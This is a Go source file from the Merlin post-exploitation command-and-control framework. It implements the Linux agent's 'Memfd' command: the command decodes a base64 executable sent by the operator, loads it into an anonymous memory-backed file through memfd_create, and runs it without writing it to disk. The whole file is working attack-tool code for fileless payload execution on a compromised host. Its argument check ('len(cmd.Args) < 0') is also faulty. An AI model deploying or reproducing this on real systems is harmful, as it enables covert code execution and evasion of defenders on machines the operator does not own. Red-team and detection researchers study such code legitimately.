// +build linux

// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2021  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package commands

import (
	// Standard
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"

	// External
	"golang.org/x/sys/unix"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/agent/cli"
	"github.com/Ne0nd0g/merlin/pkg/jobs"
)

// Memfd places a linux executable file in-memory, executes it, and returns the results
// Uses the linux memfd_create API call to create an anonymous file
// https://man7.org/linux/man-pages/man2/memfd_create.2.html
// http://manpages.ubuntu.com/manpages/bionic/man2/memfd_create.2.html
func Memfd(cmd jobs.Command) (result jobs.Results) {
	if len(cmd.Args) < 0 {
		result.Stderr = fmt.Sprintf("Expected 1 or more arguments for the Memfd command, recieved: %d", len(cmd.Args))
		return
	}
	// Base64 decode the executable
	b, err := base64.StdEncoding.DecodeString(cmd.Args[0])
	if err != nil {
		panic(err)
	}

	// Create Memory File
	fd, err := memfile("", b)
	if err != nil {
		result.Stderr = fmt.Sprintf("there was an error creating the memfd file:\r\n%s", err)
		return
	}

	// filepath to our newly created in-memory file descriptor
	fp := fmt.Sprintf("/proc/%d/fd/%d", os.Getpid(), fd)

	// create an *os.File, should you need it
	// alternatively, pass fd or fp as input to a library.
	f := os.NewFile(uintptr(fd), fp)

	defer func() {
		if err := f.Close(); err != nil {
			result.Stderr += err.Error()
		}
	}()

	var args []string
	if len(cmd.Args) > 1 {
		args = cmd.Args[1:]
	}

	cli.Message(cli.SUCCESS, fmt.Sprintf("Executing anonymous file from memfd_create with arguments: %s", args))
	command := exec.Command(fp, args...) // #nosec G204
	stdout, stderr := command.CombinedOutput()
	if len(stdout) > 0 {
		result.Stdout = fmt.Sprintf("%s", stdout)
		cli.Message(cli.SUCCESS, fmt.Sprintf("Command output:\r\n\r\n%s", result.Stdout))

	}
	if stderr != nil {
		result.Stderr = stderr.Error()
		cli.Message(cli.WARN, fmt.Sprintf("There was an error executing the memfd_create command:\n%s", stderr))
	}

	return
}

// memfile takes a file name used, and the byte slice containing data the file should contain.
// name does not need to be unique, as it's used only for debugging purposes.
// It is up to the caller to close the returned descriptor.
// Function retrieved from https://terinstock.com/post/2018/10/memfd_create-Temporary-in-memory-files-with-Go-and-Linux/
func memfile(name string, b []byte) (int, error) {
	fd, err := unix.MemfdCreate(name, 0)
	if err != nil {
		return 0, fmt.Errorf("there was an error calling memfd_create():\r\n%s", err)
	}

	err = unix.Ftruncate(fd, int64(len(b)))
	if err != nil {
		return 0, fmt.Errorf("there was an error calling ftruncate():\r\n%s", err)
	}

	data, err := unix.Mmap(fd, 0, len(b), unix.PROT_READ|unix.PROT_WRITE, unix.MAP_SHARED)
	if err != nil {
		return 0, fmt.Errorf("there was an error calling mmap():\r\n%s", err)
	}

	copy(data, b)

	err = unix.Munmap(data)
	if err != nil {
		return 0, fmt.Errorf("there was an error calling munmap():\r\n%s", err)
	}

	return fd, nil
}
